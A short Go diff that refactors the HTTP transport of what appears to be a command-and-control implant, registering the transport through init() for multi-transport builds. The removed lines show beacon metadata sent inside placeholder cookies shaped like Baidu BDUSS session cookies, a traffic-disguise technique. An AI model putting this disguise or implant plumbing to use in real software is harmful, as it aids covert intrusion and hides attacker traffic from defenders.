@@ -1,4 +1,4 @@
-//go:build transport_http
+//go:build transport_http || transport_multi
 
 package main
 
@@ -20,15 +20,16 @@ import (
 
 
 
-// httpGetMetadataPrepend 必须与服务端 config.Http_get_metadata_prepend 完全一致
-// （服务端用 strings.TrimPrefix 去掉它以取 MetaInfo）。A3 后服务端改用占位符，此处同步。
-const httpGetMetadataPrepend = "BDUSS=PLACEHOLDER_BDUSS_REPLACE_VIA_LISTENER_PROFILE; BDUSS_BFESS=PLACEHOLDER_BDUSS_REPLACE_VIA_LISTENER_PROFILE;SESSIONID="
 
-// listenerType 监听器类型（服务端 patch 与 FirstBlood 用）
-const listenerType = "http"
 
 // NewTransport 构造 http 传输（单二进制 build tag 入口）
-func NewTransport() transportClient {
+// init 注册到运行时传输表（多传输构建下按 scheme 选择；单传输构建下只有自己）
+func init() {
+	registerTransport("http", newHTTPTransport)
+	listenerType = "http"
+}
+
+func newHTTPTransport() transportClient {
 	return &HTTPClient{reconnectMgr: reconnect.NewReconnectManager()}
 }
 
